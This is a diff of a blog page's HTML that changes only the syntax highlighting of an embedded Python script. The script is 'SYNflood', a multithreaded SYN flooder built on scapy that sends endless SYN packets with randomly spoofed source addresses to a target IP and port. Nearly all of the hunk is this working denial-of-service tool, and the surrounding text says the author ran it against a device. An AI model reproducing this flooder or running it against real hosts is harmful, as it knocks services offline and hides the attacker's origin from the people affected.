@@ -955,48 +955,48 @@ The problem with that operation is that we always need to resend some packets th
 
 <p>To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.</p>
 
-<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">#!/usr/bin/env python
-#########################################
-#
-# SYNflood - A multithreaded SYN Flooder
-# author: arthurnn
-#
-#
-#########################################
-import socket, random, sys, threading
-from scapy.all import *
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
+<span class="c">#########################################</span>
+<span class="c">#</span>
+<span class="c"># SYNflood - A multithreaded SYN Flooder</span>
+<span class="c"># author: arthurnn</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#########################################</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">threading</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 
-if len(sys.argv) != 3:
-	print "Usage: %s &lt;Target IP&gt; &lt;Port&gt;" % sys.argv[0]
-	sys.exit(1)
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+	<span class="k">print</span> <span class="s">"Usage: </span><span class="si">%</span><span class="s">s &lt;Target IP&gt; &lt;Port&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-target = sys.argv[1]
-port = int(sys.argv[2])
+<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
 
-total = 0
-conf.iface='en1';#network card XD
+<span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">conf</span><span class="o">.</span><span class="n">iface</span><span class="o">=</span><span class="s">'en1'</span><span class="p">;</span><span class="c">#network card XD</span>
 
-class sendSYN(threading.Thread):
-	global target, port
-	def __init__(self):
-		threading.Thread.__init__(self)
-	def run(self):
-		i = IP()
-		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
-		i.dst = target
+<span class="k">class</span> <span class="nc">sendSYN</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">target</span><span class="p">,</span> <span class="n">port</span>
+	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">i</span> <span class="o">=</span> <span class="n">IP</span><span class="p">()</span>
+		<span class="n">i</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i.</span><span class="si">%</span><span class="s">i"</span> <span class="o">%</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">),</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">))</span>
+		<span class="n">i</span><span class="o">.</span><span class="n">dst</span> <span class="o">=</span> <span class="n">target</span>
 
-		t = TCP()
-		t.sport = random.randint(1,65535)
-		t.dport = port
-		t.flags = 'S'
+		<span class="n">t</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">()</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">sport</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65535</span><span class="p">)</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">dport</span> <span class="o">=</span> <span class="n">port</span>
+		<span class="n">t</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="s">'S'</span>
 
-		send(i/t, verbose=0)
+		<span class="n">send</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">t</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 
-print "Flooding %s:%i with SYN packets." % (target, port)
-while 1:
-	sendSYN().start()
-	total += 1
-	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+<span class="k">print</span> <span class="s">"Flooding </span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">i with SYN packets."</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+	<span class="n">sendSYN</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+	<span class="n">total</span> <span class="o">+=</span> <span class="mi">1</span>
+	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">Total packets sent:</span><span class="se">\t\t\t</span><span class="si">%</span><span class="s">i"</span> <span class="o">%</span> <span class="n">total</span><span class="p">)</span>
 
 
   </code></pre></figure>
